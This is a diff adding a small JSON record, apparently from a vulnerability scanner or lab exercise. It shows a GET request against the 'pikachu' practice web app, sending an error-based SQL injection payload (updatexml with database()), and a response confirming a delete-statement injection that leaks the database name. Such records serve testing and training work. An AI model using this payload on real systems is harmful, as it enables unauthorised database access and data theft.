@@ -1,0 +1,18 @@
+{
+    "request": {
+      "host": "10.10.1.1",
+      "method": "get",
+      "url": "http://10.10.1.1:10000//vul/sqli/sqli_del.php?id=57",
+      "cookie": "",
+      "requestheader": "",
+      "requestbody": "1%20or%20updatexml(1,concat(0x7e,database()),0)"
+    },
+    "response": {
+      "statuscode": 200,
+      "statusmessage": "[+] 存在deletesql注入",
+      "responsetime": "",
+      "responseheader": "",
+      "responsebody": "XPATH syntax error: '~pikachu'"
+    }
+  }
+  
